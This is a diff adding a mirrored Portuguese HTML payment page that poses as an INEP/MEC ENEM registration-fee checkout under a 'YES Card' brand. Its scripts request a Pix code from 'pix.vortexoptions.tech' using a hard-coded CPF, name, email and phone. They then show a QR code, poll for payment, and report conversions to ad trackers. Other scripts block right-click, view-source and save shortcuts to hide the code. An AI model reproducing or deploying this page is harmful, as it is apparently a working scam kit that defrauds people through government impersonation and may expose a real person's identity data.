@@ -1,0 +1,512 @@
+<!DOCTYPE html><html lang="pt-BR">
+<!-- Mirrored from bluecard-br.pro/card/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Apr 2025 19:45:55 GMT -->
+
+
+<!-- Twitter conversion tracking base code -->
+<script>
+!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
+},s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',
+a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
+twq('config','pnpxk');
+</script>
+<!-- End Twitter conversion tracking base code -->
+
+<!-- Twitter conversion tracking event code -->
+<script type="text/javascript">
+  // Insert Twitter Event ID
+  twq('event', 'tw-pk91l-pk91m', {
+    conversion_id: null // use this to pass a unique ID for the conversion event for deduplication (e.g. order id '1a2b3c')
+  });
+</script>
+<!-- End Twitter conversion tracking event code -->
+<head>
+    
+<script 
+        src="https://cdn.xtracky.com/scripts/utm-handler.js"
+        data-token="6cca8ea5-7c6e-4ff5-b1f5-4eba3d40e567"
+        data-click-id-param="click_id">
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Interesse com Cartão de Crédito</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="../../fonts.googleapis.com/css25c09.css?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet">
+
+    <style>
+      :root {
+        --primary-color: #000000;
+        --primary-light: rgba(0, 0, 0, 0.1);
+      }
+
+      body {
+        font-family: "Poppins", sans-serif;
+        background-color: #f9f9f9;
+        color: #333;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      .header {
+        background-color: #ffffff;
+        padding: 20px 0;
+        text-align: center;
+        background: linear-gradient(147deg, #f9f9f9 0%, #f9f9f9 74%);
+      }
+
+      .header img {
+        width: 150px;
+      }
+
+      .main-content {
+        max-width: 500px;
+        background: #fff;
+        margin: 30px auto;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      }
+
+      .btn-simple {
+        width: 100%;
+        margin-bottom: 10px;
+        padding: 12px;
+        background: #0d64fb;
+        border: none;
+        border-radius: 8px;
+        font-weight: bold;
+        color: rgb(255, 255, 255);
+        text-align: center;
+        cursor: pointer;
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+      }
+
+      .btn-simple:hover {
+        transform: scale(1.05);
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      }
+
+      .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+      }
+   .container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 80%;
+    }
+    .total {
+      font-size: 1.2rem;
+      color: #484848;
+    }
+    .total strong {
+      color: #117bbe;
+    }
+    .message {
+      font-size: 1rem;
+      color: #484848;
+      margin: 10px 0;
+    }
+    .pix-input {
+      width: 90%;
+      padding: 10px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      color: #484848;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .copy-button {
+      background-color: #117bbe;
+      color: white;
+      border: none;
+      padding: 10px;
+      font-size: 1rem;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background-color 0.1s, transform 0.1s;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .copy-button:hover {
+      background-color: #1B4C85;
+    }
+    .copy-button.copied {
+      background-color: #1B4C85;
+      transform: scale(1.05);
+    }
+    .log-container {
+      margin-top: 20px;
+      padding: 10px;
+      background-color: #ffffff;
+      border-radius: 8px;
+      text-align: left;
+      max-width: 400px;
+      width: 80%;
+      font-size: 0.9rem;
+      color: #333;
+      overflow-y: auto;
+      max-height: 150px;
+    }
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1B4C85;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+     #qrcode {
+    display: none;
+    margin: 20px auto;
+    width: fit-content;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+    <script>
+      if (document.addEventListener) {
+        document.addEventListener("keydown", bloquearSource);
+      } else {
+        //Versões antigas do IE
+        document.attachEvent("onkeydown", bloquearSource);
+      }
+
+      function bloquearSource(e) {
+        e = e || window.event;
+
+        var code = e.which || e.keyCode;
+
+        if (
+          e.ctrlKey &&
+          (code == 83 || code == 85) //83 = S, 85 = U
+        ) {
+          if (e.preventDefault) {
+            e.preventDefault();
+          } else {
+            e.returnValue = false;
+          }
+
+          return false;
+        }
+      }
+    </script>
+    <style>
+      /*desabilita a seleção no body*/
+      body {
+        -webkit-touch-callout: none; /* iOS Safari */
+        -webkit-user-select: none; /* Chrome/Safari/Opera */
+        -khtml-user-select: none; /* Konqueror */
+        -moz-user-select: none; /* Firefox */
+        -ms-user-select: none; /* Internet Explorer/Edge */
+        user-select: none;
+      }
+
+      /*habilita a seleção nos campos editaveis*/
+      input,
+      textarea {
+        -webkit-touch-callout: initial; /* iOS Safari */
+        -webkit-user-select: text; /* Chrome/Safari/Opera */
+        -khtml-user-select: text; /* Konqueror */
+        -moz-user-select: text; /* Firefox */
+        -ms-user-select: text; /* Internet Explorer/Edge */
+        user-select: text;
+      }
+
+      /*habilita a seleção nos campos com o atributo contenteditable*/
+      [contenteditable="true"] {
+        -webkit-touch-callout: initial; /* iOS Safari */
+        -webkit-user-select: all; /* Chrome/Safari/Opera */
+        -khtml-user-select: all; /* Konqueror */
+        -moz-user-select: all; /* Firefox */
+        -ms-user-select: all; /* Internet Explorer/Edge */
+        user-select: all;
+      }
+    </style>
+
+    <script>
+      if (document.addEventListener) {
+        document.addEventListener("contextmenu", function (e) {
+          e.preventDefault();
+          return false;
+        });
+      } else {
+        //Versões antigas do IE
+        document.attachEvent("oncontextmenu", function (e) {
+          e = e || window.event;
+          e.returnValue = false;
+          return false;
+        });
+      }
+    </script>
+
+    <!-- Header -->
+    </head><body><div class="header">
+      <img decoding="async" style="width: 120px" src="https://www.inscricao-enem-inep.site/pagamento/images/logo.png" alt="YES Card">
+    </div>
+  <!-- Biblioteca para gerar o QR Code -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+</head>
+
+<body>
+
+<div class="container">
+  <p class="total">Taxa de Inscrição: <strong>R$ 85,00</strong></p>
+  <div id="loader" class="loader"></div>
+
+  <p class="message" id="pixMessage" style="display: none;">Copie o código Pix abaixo ou escaneie o QR Code para pagar.</p>
+
+  <!-- QR Code aparece aqui -->
+  <div id="qrcode" style="display: none; margin: 20px auto;"></div>
+
+  <!-- Código Pix (copia e cola) -->
+  <input type="text" id="pixCode" class="pix-input" readonly style="display: none;">
+
+  <!-- Botão copiar -->
+  <button class="copy-button" id="copyButton" onclick="copyPixCode()">
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="22" width="22" xmlns="http://www.w3.org/2000/svg">
+      <path d="M20 2H10c-1.103 0-2 .897-2 2v4H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2v-4h4c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM4 20V10h10l.002 10H4zm16-6h-4v-4c0-1.103-.897-2-2-2h-4V4h10v10z"></path>
+    </svg>
+    COPIAR
+  </button>
+
+  <!-- Logs / Erros -->
+  <div class="log-container" id="logContainer" style="display: none;"></div>
+
+  <!-- Dicas de pagamento -->
+  <div class="how-to-pay" style="background-color: #F8F8F8; padding: 20px; border-radius: 8px; margin-top: 20px;">
+    <h3>Como pagar?</h3>
+    <div class="tip" style="display: flex; align-items: center; margin-bottom: 10px;">
+      <img src="./images/tip-copy-paste.svg" alt="Copiar e colar" style="width: 54px; height: 54px; margin-right: 10px;">
+      <p style="margin: 0; color: #484848; font-size: 14px; text-align: left;">Cole o código Pix em seu app bancário ou carteira digital de preferência e confirme o pagamento.</p>
+    </div>
+    <div class="tip" style="display: flex; align-items: center; margin-bottom: 10px;">
+      <img src="./images/tip-smartphone-confirmation.svg" alt="Confirmação" style="width: 54px; height: 54px; margin-right: 10px;">
+      <p style="margin: 0; color: #484848; font-size: 14px; text-align: left;">Seu pagamento será aprovado em alguns instantes.</p>
+    </div>
+  </div>
+</div>
+
+<!-- JavaScript -->
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    async function gerarPix() {
+      const loader = document.getElementById('loader');
+      const pixMessage = document.getElementById('pixMessage');
+      const pixCode = document.getElementById('pixCode');
+      const copyButton = document.getElementById('copyButton');
+      const logContainer = document.getElementById('logContainer');
+      const qrcodeDiv = document.getElementById('qrcode');
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmSource = urlParams.get('utm_source') || '';
+      const utmMedium = urlParams.get('utm_medium') || '';
+      const utmCampaign = urlParams.get('utm_campaign') || '';
+      const utmTerm = urlParams.get('utm_term') || '';
+      const utmContent = urlParams.get('utm_content') || '';
+      const xcod = urlParams.get('xcod') || '';
+
+      const data = {
+        id_oferta: "d869ffda-09d4-4a6a-a671-b1761551dd34",
+        cpf: "35033891804",
+        email: "marcelo@admin.com",
+        nome: "Marcelo Ferreira",
+        telefone: "11987654321",
+        utmSource: utmSource,
+        utmMedium: utmMedium,
+        utmCampaign: utmCampaign,
+        utmTerm: utmTerm,
+        utmContent: utmContent,
+        xcod: xcod
+        
+      };
+
+      try {
+        const response = await fetch('https://pix.vortexoptions.tech/pix_falcon', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+
+        const result = await response.json();
+        
+        console.log(result);
+
+        if (result && result.pix) {
+          loader.style.display = 'none';
+          pixMessage.style.display = 'block';
+          pixCode.style.display = 'block';
+          copyButton.style.display = 'flex';
+          logContainer.style.display = 'block';
+          pixCode.value = result.pix;
+          setInterval(() => {
+            verificarPix(result.id_pedido)
+            }, 5000);
+        // Gerar QR Code
+          qrcodeDiv.style.display = 'block';
+          qrcodeDiv.innerHTML = ''; // limpar antigo
+          new QRCode(qrcodeDiv, {
+            text: result.pix,
+            width: 200,
+            height: 200
+          });
+          
+          
+        } else {
+          loader.style.display = 'none';
+          logContainer.style.display = 'block';
+          logContainer.innerHTML = '<span style="color: red;">Erro: Resposta inesperada.</span>';
+        }
+
+      } catch (error) {
+        loader.style.display = 'none';
+        logContainer.style.display = 'block';
+        logContainer.innerHTML = '<span style="color: red;">Erro ao gerar PIX: ' + error.message + '</span>';
+      }
+    }
+
+    function getAllParameters() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmSource = urlParams.get('utm_source') || '';
+        const utmMedium = urlParams.get('utm_medium') || '';
+        const utmCampaign = urlParams.get('utm_campaign') || '';
+        const utmTerm = urlParams.get('utm_term') || '';
+        const utmContent = urlParams.get('utm_content') || '';
+        const xcod = urlParams.get('xcod') || '';
+  
+        return {
+            utmSource: utmSource,
+            utmMedium: utmMedium,
+            utmCampaign: utmCampaign,
+            utmTerm: utmTerm,
+            utmContent: utmContent,
+            xcod: xcod
+        };
+    }
+  
+    function redirect_UTM() {
+        const params = getAllParameters();
+        
+        const baseUrl = 'bluecard/ativar-conta/';
+        let urlWithAllParams = baseUrl + '&utm_source=' + encodeURIComponent(params.utmSource) +
+                               '&utm_medium=' + encodeURIComponent(params.utmMedium) +
+                               '&utm_campaign=' + encodeURIComponent(params.utmCampaign) +
+                               '&utm_term=' + encodeURIComponent(params.utmTerm) +
+                               '&utm_content=' + encodeURIComponent(params.utmContent) +
+                               '&xcod=' + encodeURIComponent(params.xcod);
+  
+        return urlWithAllParams;
+    }
+
+
+    async function verificarPix(token) {
+        const data = {
+            hash: token
+        }
+        const response = await fetch('https://pix.vortexoptions.tech/verificar_falcon', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+        if ( response.status == 200 ) {
+            console.log(`pagamento aprovado`)
+            const extractUTMParams = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            return {
+                utm_source: urlParams.get('utm_source') || '',
+                utm_campaign: urlParams.get('utm_campaign') || '',
+                utm_medium: urlParams.get('utm_medium') || '',
+                utm_content: urlParams.get('utm_content') || '',
+                utm_term: urlParams.get('utm_term') || '',
+                subid: urlParams.get('subid') || '',
+                sid2: urlParams.get('sid2') || '',
+                subid2: urlParams.get('subid2') || '',
+                subid3: urlParams.get('subid3') || '',
+                subid4: urlParams.get('subid4') || '',
+                subid5: urlParams.get('subid5') || '',
+                xcod: urlParams.get('xcod') || '',
+                sck: urlParams.get('sck') || '',
+                token: 'token_do_cliente'
+            };
+        };
+                    setTimeout(() => {
+              location.href = redirect_UTM()
+            }, 2000);
+
+            const utms = extractUTMParams();
+            const response = await fetch('https://pix.vortexoptions.tech/falcon_utmify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(utms)
+            });
+
+        }
+
+
+    }
+
+    window.copyPixCode = async function() {
+      const pixCode = document.getElementById('pixCode');
+      const copyButton = document.getElementById('copyButton');
+
+      try {
+        await navigator.clipboard.writeText(pixCode.value);
+        copyButton.classList.add('copied');
+        copyButton.innerText = "COPIADO!";
+
+        setTimeout(() => {
+          copyButton.classList.remove('copied');
+          copyButton.innerHTML = `<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="22" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M20 2H10c-1.103 0-2 .897-2 2v4H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2v-4h4c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM4 20V10h10l.002 10H4zm16-6h-4v-4c0-1.103-.897-2-2-2h-4V4h10v10z"></path></svg> COPIAR`;
+        }, 2000);
+      } catch (err) {
+        alert('Erro ao copiar PIX: ' + err);
+      }
+    }
+    gerarPix();
+  });
+</script>
+
+<footer class="text-white py-4 text-xs" style="background-color: #1c2b39; width: 100%;">
+  <div class="flex flex-col items-center mb-2 text-center">
+    <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
+      <defs>
+        <style>.cls-2{fill:#fff}</style>
+      </defs>
+      <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"></path>
+    </svg>
+    <p class="text-sm mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+  </div>
+
+  <div class="flex flex-col items-center justify-center space-y-2 text-center">
+    <div>
+      © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
+    </div>
+    <div class="flex items-center justify-center">
+      <i class="fas fa-phone-alt mr-1"></i>
+      0800 616161
+    </div>
+  </div>
+</footer>
+</body>
+</html>
